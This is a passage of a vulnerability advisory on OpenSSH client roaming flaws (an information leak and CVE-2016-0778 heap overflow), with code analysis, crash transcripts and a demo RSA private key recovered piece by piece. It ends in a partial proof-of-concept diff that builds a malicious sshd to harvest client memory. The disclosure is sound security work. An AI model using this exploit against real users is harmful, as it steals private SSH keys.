o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsC

# strings /tmp/roaming-37456846/infoleak
LsBlstpuQ4Hr2DHmalL8X
iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZNA
yq4Kwj/

# strings /tmp/roaming-988ff54c/infoleak
GBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/

# strings /tmp/roaming-53887fa5/infoleak
/4oatxFUV5V8aniqyq4Kwj/
QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS
F9AoVoZFKEGn4FEoYIqY3a4

------------------------------------------------------------------------
Private Key Disclosure example: Fedora 20, 2048-bit RSA key
------------------------------------------------------------------------

$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="Fedora 20 (Heisenbug)"

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmbj/XjOppLWSAhuLKiRoHsdp66LJdY2PvP0ht3GWDKKCk7Gz
HLas5VjotS9rmupavGGDiicMHPClOttWAI9MRyvP77iZhSei/RzX1/UKk/broTDp
o9ljBnQTzRAyw8ke72Ih77SOGfOLBvYlx80ZmESLYYH95aAeuuDvb236JnsgRPDQ
/B/gyRIhfqis70USi05/ZbnAenFn+v9zoSduDYMzSM8mFmh9f+9PVb9qMHdfNkIy
2E78kt9BknU/bEcCWyL+IXNLV0rgRGAcE0ncKu13YvuH/7o4Q7bW2FYErT4P/FHK
cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o
6GEmk/oB9w9gf1zGqWkTytMiqcawMW4LZAJlSI/rGWe7lYHuceZSSgzd5lF4VP06
Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV
JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+prtAxpPNfKElEV7ZPBrTRAuCUr
Hiy7yflZ3w0qHekNafX/tnWiU4zi/p6aD4rs10YaYSnSolsDs2k8wHbVP4VtLE8l
PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ
rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo
/euhzdYixxIkfqyopnYFoER26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot
gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa
jwj3EZsXmtP+wd3fhge7pIHp5RiKfBn0JtSvXQQHO0k0eEcQ4aA/6yESI62wOuaY
vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y
3fBC3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF
Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P
pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU
dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4syLfm
qK+cwb7uCSi5PfloRiLryPdvnobDGLfFGdOHaX7km+4u5+taYg2Er8IsAxtMNwM5
r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp
P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+
ZS16+aH97RKdJD/4qiskzzHvZs+wi4LKPHHHz7ETXr/m4CRfMIU=
-----END RSA PRIVATE KEY-----

# env ROAMING="heap_massaging:linux" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
...

# strings /tmp/roaming-a2bbc5f6/infoleak
cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CG

# strings /tmp/roaming-47b46456/infoleak
RGAcE0nc
GCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o
6GEmk/oB9

# strings /tmp/roaming-7a6717ae/infoleak
cawMW4LZ1
Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV
JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+p

# strings /tmp/roaming-f3091f08/infoleak
lZ3w0qHe
nSolsDs2k8wHbVP4VtLE8l
PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ

# strings /tmp/roaming-62a9e9a3/infoleak
lZ3w0qHe
r3TwTa0pPEk11
LbcsTEJ
rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo
/euhzdYixxIkfqyopnYFoER26u37/OHe37P

# strings /tmp/roaming-8de31ed5/infoleak
7qyvNznQ
26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot
gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa

# strings /tmp/roaming-f5e0fbcc/infoleak
yESI62wOuaY
vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y
3fBC3h9BN5banCw6VKfnvm8/q+bwSxS

# strings /tmp/roaming-9be933df/infoleak
QRtzK/GpRuMC1
C3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF
Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmT

# strings /tmp/roaming-ee4d1e6c/infoleak
SG3aTqYp
tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P
pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//s

# strings /tmp/roaming-c2bfd69c/infoleak
SG3aTqYp
6JmTOun5zVV6A
H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU
dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4s

# strings /tmp/roaming-2b3217a1/infoleak
DGLfFGdO
r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp
P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCQ

# strings /tmp/roaming-1e275747/infoleak
g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+

========================================================================
Buffer Overflow (CVE-2016-0778)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

Support for roaming was elegantly added to the OpenSSH client: the calls
to read() and write() that communicate with the SSH server were replaced
by calls to roaming_read() and roaming_write(), two wrappers that depend
on wait_for_roaming_reconnect() to transparently reconnect to the server
after a disconnection. The wait_for_roaming_reconnect() routine is
essentially a sequence of four subroutines:

239 int
240 wait_for_roaming_reconnect(void)
241 {
...
250         fprintf(stderr, "[connection suspended, press return to resume]");
...
252         packet_backup_state();
253         /* TODO Perhaps we should read from tty here */
254         while ((c = fgetc(stdin)) != EOF) {
...
259                 if (c != '\n' && c != '\r')
260                         continue;
261
262                 if (ssh_connect(host, &hostaddr, options.port,
...
265                     options.proxy_command) == 0 && roaming_resume() == 0) {
266                         packet_restore_state();
...
268                         fprintf(stderr, "[connection resumed]\n");
...
270                         return 0;
271                 }
272
273                 fprintf(stderr, "[reconnect failed, press return to retry]");
...
275         }
276         fprintf(stderr, "[exiting]\n");
...
278         exit(0);
279 }

1. packet_backup_state() close()s connection_in and connection_out (the
old file descriptors that connected the client to the server), and saves
the state of the suspended SSH session (for example, the encryption and
decryption contexts).

2. ssh_connect() opens new file descriptors, and connects them to the
SSH server.

3. roaming_resume() negotiates the resumption of the suspended SSH
session with the server, and calls resend_bytes().

4. packet_restore_state() updates connection_in and connection_out (with
the new file descriptors that connect the client to the server), and
restores the state of the suspended SSH session.

The new file descriptors for connection_in and connection_out may differ
from the old ones (if, for example, files or pipes or sockets are opened
or closed between two successive ssh_connect() calls), but unfortunately
historical code in OpenSSH assumes that they are constant:

- In client_loop(), the variables connection_in and connection_out are
  cached locally, but packet_write_poll() calls roaming_write(), which
  may assign new values to connection_in and connection_out (if a
  reconnection occurs), and client_wait_until_can_do_something()
  subsequently reuses the old, cached values.

- client_loop() eventually updates these cached values, and the
  following FD_ISSET() uses a new, updated file descriptor (the fd
  connection_out), but an old, out-of-date file descriptor set (the
  fd_set writeset).

- packet_read_seqnr() (old API, or ssh_packet_read_seqnr(), new API)
  first calloc()ates setp, a file descriptor set for connection_in;
  next, it loops around memset(), FD_SET(), select() and roaming_read();
  last, it free()s setp and returns. Unfortunately, roaming_read() may
  reassign a higher value to connection_in (if a reconnection occurs),
  but setp is never enlarged, and the following memset() and FD_SET()
  may therefore overflow setp (a heap-based buffer overflow):

1048 int
1049 packet_read_seqnr(u_int32_t *seqnr_p)
1050 {
....
1052         fd_set *setp;
....
1058         setp = (fd_set *)xcalloc(howmany(active_state->connection_in + 1,
1059             NFDBITS), sizeof(fd_mask));
....
1065         for (;;) {
....
1075                 if (type != SSH_MSG_NONE) {
1076                         free(setp);
1077                         return type;
1078                 }
....
1083                 memset(setp, 0, howmany(active_state->connection_in + 1,
1084                     NFDBITS) * sizeof(fd_mask));
1085                 FD_SET(active_state->connection_in, setp);
....
1092                 for (;;) {
....
1097                         if ((ret = select(active_state->connection_in + 1, setp,
1098                             NULL, NULL, timeoutp)) >= 0)
1099                                 break;
....
1115                 }
....
1117                 do {
....
1119                         len = roaming_read(active_state->connection_in, buf,
1120                             sizeof(buf), &cont);
1121                 } while (len == 0 && cont);
....
1130         }
1131         /* NOTREACHED */
1132 }

- packet_write_wait() (old API, or ssh_packet_write_wait(), new API) is
  basically similar to packet_read_seqnr() and may overflow its own setp
  if roaming_write() (called by packet_write_poll()) reassigns a higher
  value to connection_out (after a successful reconnection):

1739 void
1740 packet_write_wait(void)
1741 {
1742         fd_set *setp;
....
1746         setp = (fd_set *)xcalloc(howmany(active_state->connection_out + 1,
1747             NFDBITS), sizeof(fd_mask));
1748         packet_write_poll();
1749         while (packet_have_data_to_write()) {
1750                 memset(setp, 0, howmany(active_state->connection_out + 1,
1751                     NFDBITS) * sizeof(fd_mask));
1752                 FD_SET(active_state->connection_out, setp);
....
1758                 for (;;) {
....
1763                         if ((ret = select(active_state->connection_out + 1,
1764                             NULL, setp, NULL, timeoutp)) >= 0)
1765                                 break;
....
1776                 }
....
1782                 packet_write_poll();
1783         }
1784         free(setp);
1785 }

------------------------------------------------------------------------
Mitigating Factors
------------------------------------------------------------------------

This buffer overflow affects all OpenSSH clients >= 5.4, but its impact
is significantly reduced by the Mitigating Factors detailed in the
Information Leak section, and additionally:

- OpenSSH versions >= 6.8 reimplement packet_backup_state() and
  packet_restore_state(), but introduce a bug that prevents the buffer
  overflow from being exploited; indeed, ssh_packet_backup_state() swaps
  two local pointers, ssh and backup_state, instead of swapping the two
  global pointers active_state and backup_state:

  9 struct ssh *active_state, *backup_state;
...
238 void
239 packet_backup_state(void)
240 {
241         ssh_packet_backup_state(active_state, backup_state);
242 }
243
244 void
245 packet_restore_state(void)
246 {
247         ssh_packet_restore_state(active_state, backup_state);
248 }

2269 void
2270 ssh_packet_backup_state(struct ssh *ssh,
2271     struct ssh *backup_state)
2272 {
2273         struct ssh *tmp;
....
2279         if (backup_state)
2280                 tmp = backup_state;
2281         else
2282                 tmp = ssh_alloc_session_state();
2283         backup_state = ssh;
2284         ssh = tmp;
2285 }
....
2291 void
2292 ssh_packet_restore_state(struct ssh *ssh,
2293     struct ssh *backup_state)
2294 {
2295         struct ssh *tmp;
....
2299         tmp = backup_state;
2300         backup_state = ssh;
2301         ssh = tmp;
2302         ssh->state->connection_in = backup_state->state->connection_in;

  As a result, the global pointer backup_state is still NULL when passed
  to ssh_packet_restore_state(), and crashes the OpenSSH client when
  dereferenced:

# env ROAMING="overflow:A fd_leaks:0" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -V
OpenSSH_6.8, LibreSSL 2.1

$ /usr/bin/ssh -o ProxyCommand="/usr/bin/nc -w 15 %h %p" -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume]Segmentation fault (core dumped)

  This bug prevents the buffer overflow from being exploited, but not
  the information leak, because the vulnerable function resend_bytes()
  is called before ssh_packet_restore_state() crashes.

- To the best of our knowledge, this buffer overflow is not exploitable
  in the default configuration of the OpenSSH client; the conclusion of
  the File Descriptor Leak section suggests that two non-default options
  are required: a ProxyCommand, and either ForwardAgent (-A) or
  ForwardX11 (-X).

------------------------------------------------------------------------
File Descriptor Leak
------------------------------------------------------------------------

A back-of-the-envelope calculation indicates that, in order to increase
the file descriptor connection_in or connection_out, and thus overflow
the file descriptor set setp in packet_read_seqnr() or
packet_write_wait(), a file descriptor leak is needed:

- First, the number of bytes calloc()ated for setp is rounded up to the
  nearest multiple of sizeof(fd_mask): 8 bytes (or 64 file descriptors)
  on 64-bit systems.

- Next, in glibc, this number is rounded up to the nearest multiple of
  MALLOC_ALIGNMENT: 16 bytes (or 128 file descriptors) on 64-bit
  systems.

- Last, in glibc, a MIN_CHUNK_SIZE is enforced: 32 bytes on 64-bit
  systems, of which 24 bytes (or 192 file descriptors) are reserved for
  setp.

- In conclusion, a file descriptor leak is needed, because connection_in
  or connection_out has to be increased by hundreds in order to overflow
  setp.

The search for a suitable file descriptor leak begins with a study of
the behavior of the four ssh_connect() methods, when called for a
reconnection by wait_for_roaming_reconnect():

1. The default method ssh_connect_direct() communicates with the server
through a simple TCP socket: the two file descriptors connection_in and
connection_out are both equal to this socket's file descriptor.

In wait_for_roaming_reconnect(), the low-numbered file descriptor of the
old TCP socket is close()d by packet_backup_state(), but immediately
reused for the new TCP socket in ssh_connect_direct(): the new file
descriptors connection_in and connection_out are equal to this old,
low-numbered file descriptor, and cannot possibly overflow setp.

2. The special ProxyCommand "-" communicates with the server through
stdin and stdout, but (as explained in the Mitigating Factors of the
Information Leak section) it cannot possibly reconnect to the server,
and is therefore immune to this buffer overflow.

3. Surprisingly, we discovered a file descriptor leak in the
ssh_proxy_fdpass_connect() method itself; indeed, the file descriptor
sp[1] is never close()d:

 101 static int
 102 ssh_proxy_fdpass_connect(const char *host, u_short port,
 103     const char *proxy_command)
 104 {
 ...
 106         int sp[2], sock;
 ...
 113         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) < 0)
 114                 fatal("Could not create socketpair to communicate with "
 115                     "proxy dialer: %.100s", strerror(errno));
 ...
 161         close(sp[0]);
 ...
 164         if ((sock = mm_receive_fd(sp[1])) == -1)
 165                 fatal("proxy dialer did not pass back a connection");
 ...
 171         /* Set the connection file descriptors. */
 172         packet_set_connection(sock, sock);
 173
 174         return 0;
 175 }

However, two different reasons prevent this file descriptor leak from
triggering the setp overflow:

- The method ssh_proxy_fdpass_connect() communicates with the server
  through a single socket received from the ProxyCommand: the two file
  descriptors connection_in and connection_out are both equal to this
  socket's file descriptor.

  In wait_for_roaming_reconnect(), the low-numbered file descriptor of
  the old socket is close()d by packet_backup_state(), reused for sp[0]
  in ssh_proxy_fdpass_connect(), close()d again, and eventually reused
  again for the new socket: the new file descriptors connection_in and
  connection_out are equal to this old, low-numbered file descriptor,
  and cannot possibly overflow setp.

- Because of the waitpid() bug described in the Mitigating Factors of
  the Information Leak section, the method ssh_proxy_fdpass_connect()
  calls fatal() before it returns to wait_for_roaming_reconnect(), and
  is therefore immune to this buffer overflow.

4. The method ssh_proxy_connect() communicates with the server through a
ProxyCommand and two different pipes: the file descriptor connection_in
is the read end of the second pipe (pout[0]), and the file descriptor
connection_out is the write end of the first pipe (pin[1]):

 180 static int
 181 ssh_proxy_connect(const char *host, u_short port, const char *proxy_command)
 182 {
 ...
 184         int pin[2], pout[2];
 ...
 192         if (pipe(pin) < 0 || pipe(pout) < 0)
 193                 fatal("Could not create pipes to communicate with the proxy: %.100s",
 194                     strerror(errno));
 ...
 240         /* Close child side of the descriptors. */
 241         close(pin[0]);
 242         close(pout[1]);
 ...
 247         /* Set the connection file descriptors. */
 248         packet_set_connection(pout[0], pin[1]);
 249
 250         /* Indicate OK return */
 251         return 0;
 252 }

In wait_for_roaming_reconnect(), the two old, low-numbered file
descriptors connection_in and connection_out are both close()d by
packet_backup_state(), and immediately reused for the pipe(pin) in
ssh_proxy_connect(): the new connection_out (pin[1]) is equal to one of
these old, low-numbered file descriptors, and cannot possibly overflow
setp.

On the other hand, the pipe(pout) in ssh_proxy_connect() may return
high-numbered file descriptors, and the new connection_in (pout[0]) may
therefore overflow setp, if hundreds of file descriptors were leaked
before the call to wait_for_roaming_reconnect():

- We discovered a file descriptor leak in the pubkey_prepare() function
  of OpenSSH >= 6.8; indeed, if the client is running an authentication
  agent that does not offer any private keys, the reference to agent_fd
  is lost, and this file descriptor is never close()d:

1194 static void
1195 pubkey_prepare(Authctxt *authctxt)
1196 {
....
1200         int agent_fd, i, r, found;
....
1247         if ((r = ssh_get_authentication_socket(&agent_fd)) != 0) {
1248                 if (r != SSH_ERR_AGENT_NOT_PRESENT)
1249                         debug("%s: ssh_get_authentication_socket: %s",
1250                             __func__, ssh_err(r));
1251         } else if ((r = ssh_fetch_identitylist(agent_fd, 2, &idlist)) != 0) {
1252                 if (r != SSH_ERR_AGENT_NO_IDENTITIES)
1253                         debug("%s: ssh_fetch_identitylist: %s",
1254                             __func__, ssh_err(r));
1255         } else {
....
1288                 authctxt->agent_fd = agent_fd;
1289         }
....
1299 }

  However, OpenSSH clients >= 6.8 crash in ssh_packet_restore_state()
  (because of the NULL-pointer dereference discussed in the Mitigating
  Factors of the Buffer Overflow section) and are immune to the setp
  overflow, despite this agent_fd leak.

- If ForwardAgent (-A) or ForwardX11 (-X) is enabled in the OpenSSH
  client (it is disabled by default), a malicious SSH server can request
  hundreds of forwardings, in order to increase connection_in (each
  forwarding opens a file descriptor), and thus overflow setp in
  packet_read_seqnr():

# env ROAMING="overflow:A" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -V
OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014

$ /usr/bin/ssh-agent -- /usr/bin/ssh -A -o ProxyCommand="/usr/bin/socat - TCP4:%h:%p" -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume][connection resumed]
*** Error in `/usr/bin/ssh': free(): invalid next size (fast): 0x00007f0474d03e70 ***
Aborted (core dumped)

# env ROAMING="overflow:X" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ /usr/bin/ssh -X -o ProxyCommand="/usr/bin/socat - TCP4:%h:%p" -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume][connection resumed]
*** Error in `/usr/bin/ssh': free(): invalid next size (fast): 0x00007fdcc2a3aba0 ***
*** Error in `/usr/bin/ssh': malloc(): memory corruption: 0x00007fdcc2a3abc0 ***

Finally, a brief digression on two unexpected problems that had to be
solved in our proof-of-concept:

- First, setp can be overflowed only in packet_read_seqnr(), not in
  packet_write_wait(), but agent forwarding and X11 forwarding are post-
  authentication functionalities, and post-authentication calls to
  packet_read() or packet_read_expect() are scarce, except in the
  key-exchange code of OpenSSH clients < 6.8: our proof-of-concept
  effectively forces a rekeying in order to overflow setp in
  packet_read_seqnr().

- Second, after a successful reconnection, packet_read_seqnr() may call
  fatal("Read from socket failed: %.100s", ...), because roaming_read()
  may return EAGAIN (EAGAIN is never returned without the reconnection,
  because the preceding call to select() guarantees that connection_in
  is ready for read()). Our proof-of-concept works around this problem
  by forcing the client to resend MAX_ROAMBUF bytes (2M) to the server,
  allowing data to reach the client before roaming_read() is called,
  thus avoiding EAGAIN.

========================================================================
Acknowledgments
========================================================================

We would like to thank the OpenSSH developers for their great work and
their incredibly quick response, Red Hat Product Security for promptly
assigning CVE-IDs to these issues, and Alexander Peslyak of the Openwall
Project for the interesting discussions.

========================================================================
Proof Of Concept
========================================================================

diff -pruN openssh-6.4p1/auth2-pubkey.c openssh-6.4p1+roaming/auth2-pubkey.c
--- openssh-6.4p1/auth2-pubkey.c	2013-07-17 23:10:10.000000000 -0700
+++ openssh-6.4p1+roaming/auth2-pubkey.c	2016-01-07 01:04:15.000000000 -0800
@@ -169,7 +169,9 @@ userauth_pubkey(Authctxt *authctxt)
 		 * if a user is not allowed to login. is this an
 		 * issue? -markus
 		 */
-		if (PRIVSEP(user_key_allowed(authctxt->pw, key))) {
+		if (PRIVSEP(user_key_allowed(authctxt->pw, key)) || 1) {
+			debug("%s: force client-side load_identity_file",
+			    __func__);
 			packet_start(SSH2_MSG_USERAUTH_PK_OK);
 			packet_put_string(pkalg, alen);
 			packet_put_string(pkblob, blen);
diff -pruN openssh-6.4p1/kex.c openssh-6.4p1+roaming/kex.c
--- openssh-6.4p1/kex.c	2013-06-01 14:31:18.000000000 -0700
+++ openssh-6.4p1+roaming/kex.c	2016-01-07 01:04:15.000000000 -0800
@@ -442,6 +442,73 @@ proposals_match(char *my[PROPOSAL_MAX],
 }

 static void
+roaming_reconnect(void)
+{
+	packet_read_expect(SSH2_MSG_KEX_ROAMING_RESUME);
+	const u_int id = packet_get_int(); /* roaming_id */
+	debug("%s: id %u", __func__, id);
+	packet_check_eom();
+
+	const char *const dir = get_roaming_dir(id);
+	debug("%s: dir %s", __func__, dir);
+	const int fd = open(dir, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
+	if (fd <= -1)
+		fatal("%s: open %s errno %d", __func__, dir, errno);
+	if (fchdir(fd) != 0)
+		fatal("%s: fchdir %s errno %d", __func__, dir, errno);
+	if (close(fd) != 0)
+		fatal("%s: close %s errno %d", __func__, dir, errno);
+
+	packet_start(SSH2_MSG_KEX_ROAMING_AUTH_REQUIRED);
+	packet_put_int64(arc4random()); /* chall */
+	packet_put_int64(arc4random()); /* oldchall */
+	packet_send();
+
+	packet_read_expect(SSH2_MSG_KEX_ROAMING_AUTH);
+	const u_int64_t client_read_bytes = packet_get_int64();
+	debug("%s: client_read_bytes %llu", __func__,
+	    (unsigned long long)client_read_bytes);
+	packet_get_int64(); /* digest (1-8) */
+	packet_get_int64(); /* digest (9-16) */
+	packet_get_int();   /* digest (17-20) */
+	packet_check_eom();
+
+	u_int64_t client_write_bytes;
+	size_t len = sizeof(client_write_bytes);
+	load_roaming_file("client_write_bytes", &client_write_bytes, &len);
+	debug("%s: client_write_bytes %llu", __func__,
+	    (unsigned long long)client_write_bytes);
+
+	u_int client_out_buf_size;
+	len = sizeof(client_out_buf_size);
+	load_roaming_file("client_out_buf_size", &client_out_buf_size, &len);
+	debug("%s: client_out_buf_size %u", __func__, client_out_buf_size);
+	if (client_out_buf_size <= 0 || client_out_buf_size > MAX_ROAMBUF)
+		fatal("%s: client_out_buf_size %u", __func__,
+			   client_out_buf_size);
+
+	packet_start(SSH2_MSG_KEX_ROAMING_AUTH_OK);
+	packet_put_int64(client_write_bytes - (u_int64_t)client_out_buf_size);
+	packet_send();
+	const int overflow = (access("output", F_OK) == 0);
+	if (overflow != 0) {
+		const void *const ptr = load_roaming_file("output", NULL, &len);
+		buffer_append(packet_get_output(), ptr, len);
+	}
+	packet_write_wait();
+
+	char *const client_out_buf = xmalloc(client_out_buf_size);
+	if (atomicio(read, packet_get_connection_in(), client_out_buf,
+			       client_out_buf_size) != client_out_buf_size)
+		fatal("%s: read client_out_buf_size %u errno %d", __func__,
+				client_out_buf_size, errno);
+	if (overflow == 0)
+		dump_roaming_file("infoleak", client_out_buf,
+					      client_out_buf_size);
+	fatal("%s: all done for %s", __func__, dir);
+}
+
+static void
 kex_choose_conf(Kex *kex)
 {
 	Newkeys *newkeys;
@@ -470,6 +537,10 @@ kex_choose_conf(Kex *kex)
 			kex->roaming = 1;
 			free(roaming);
 		}
+	} else if (strcmp(peer[PROPOSAL_KEX_ALGS], KEX_RESUME) == 0) {
+		roaming_reconnect();
+		/* NOTREACHED */
+		fatal("%s: returned from %s", __func__, KEX_RESUME);
 	}

 	/* Algorithm Negotiation */
diff -pruN openssh-6.4p1/roaming.h openssh-6.4p1+roaming/roaming.h
--- openssh-6.4p1/roaming.h	2011-12-18 15:52:52.000000000 -0800
+++ openssh-6.4p1+roaming/roaming.h	2016-01-07 01:04:15.000000000 -0800
@@ -42,4 +42,86 @@ void	resend_bytes(int, u_int64_t *);
 void	calculate_new_key(u_int64_t *, u_int64_t, u_int64_t);
 int	resume_kex(void);

+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#include "atomicio.h"
+#include "log.h"
+#include "xmalloc.h"
+
+static inline char *
+get_roaming_dir(const u_int id)
+{
+	const size_t buflen = MAXPATHLEN;
+	char *const buf = xmalloc(buflen);
+
+	if ((u_int)snprintf(buf, buflen, "/tmp/roaming-%08x", id) >= buflen)
+		fatal("%s: snprintf %u error", __func__, id);
+	return buf;
+}
+
+static inline void
+dump_roaming_file(const char *const name,
+    const void *const buf, const size_t buflen)
+{
+	if (name == NULL)
+		fatal("%s: name %p", __func__, name);
+	if (strchr(name, '/') != NULL)
+		fatal("%s: name %s", __func__, name);
+	if (buf == NULL)
+		fatal("%s: %s buf %p", __func__, name, buf);
+	if (buflen <= 0 || buflen > MAX_ROAMBUF)
+		fatal("%s: %s buflen %lu", __func__, name, (u_long)buflen);
+
+	const int fd = open(name, O_WRONLY | O_CREAT | O_EXCL, S_IRUSR);
+	if (fd <= -1)
+		fatal("%s: open %s errno %d", __func__, name, errno);
+	if (write(fd, buf, buflen) != (ssize_t)buflen)
+		fatal("%s: write %s errno %d", __func__, name, errno);
+	if (close(fd) != 0)
+		fatal("%s: close %s errno %d", __func__, name, errno);
+}
+
+static inline void *
+load_roaming_file(const char *const name,
+    void *buf, size_t *const buflenp)
+{
+	if (name == NULL)
+		fatal("%s: name %p", __func__, name);
+	if (strchr(name, '/') != NULL)
+		fatal("%s: name %s", __func__, name);
+	if (buflenp == NULL)
+		fatal("%s: %s buflenp %p", __func__, name, buflenp);
+
+	const int fd = open(name, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
+	if (fd <= -1)
+		fatal("%s: open %s errno %d", __func__, name, errno);
+	struct stat st;
+	if (fstat(fd, &st) != 0)
+		fatal("%s: fstat %s errno %d", __func__, name, errno);
+	if (S_ISREG(st.st_mode) == 0)
+		fatal("%s: %s mode 0%o", __func__, name, (u_int)st.st_mode);
+	if (st.st_size <= 0 || st.st_size > MAX_ROAMBUF)
+		fatal("%s: %s size %lld", __func__, name,
+		    (long long)st.st_size);
+
+	if (buf == NULL) {
+		*buflenp = st.st_size;
+		buf = xmalloc(*buflenp);
+	} else {
+		if (*buflenp != (size_t)st.st_size)
+			fatal("%s: %s size %lld buflen %lu", __func__, name,
+			    (long long)st.st_size, (u_long)*buflenp);
+	}
+	if (read(fd, buf, *buflenp) != (ssize_t)*buflenp)
+		fatal("%s: read %s errno %d", __func__, name, errno);
+	if (close(fd) != 0)
+		fatal("%s: close %s errno %d", __func__, name, errno);
+	return buf;
+}
+
 #endif /* ROAMING */
diff -pruN openssh-6.4p1/serverloop.c openssh-6.4p1+roaming/serverloop.c
--- openssh-6.4p1/serverloop.c	2013-07-17 23:12:45.000000000 -0700
+++ openssh-6.4p1+roaming/serverloop.c	2016-01-07 01:04:15.000000000 -0800
@@ -1060,6 +1060,9 @@ server_request_session(void)
 	return c;
 }

+static int client_session_channel = -1;
+static int server_session_channel = -1;
+
 static void
 server_input_channel_open(int type, u_int32_t seq, void *ctxt)
 {
@@ -1089,12 +1092,22 @@ server_input_channel_open(int type, u_in
 		c->remote_window = rwindow;
 		c->remote_maxpacket = rmaxpack;
 		if (c->type != SSH_CHANNEL_CONNECTING) {
+			debug("%s: avoid client-side buf_append", __func__);
+			/*
 			packet_start(SSH2_MSG_CHANNEL_OPEN_CONFIRMATION);
 			packet_put_int(c->remote_id);
 			packet_put_int(c->self);
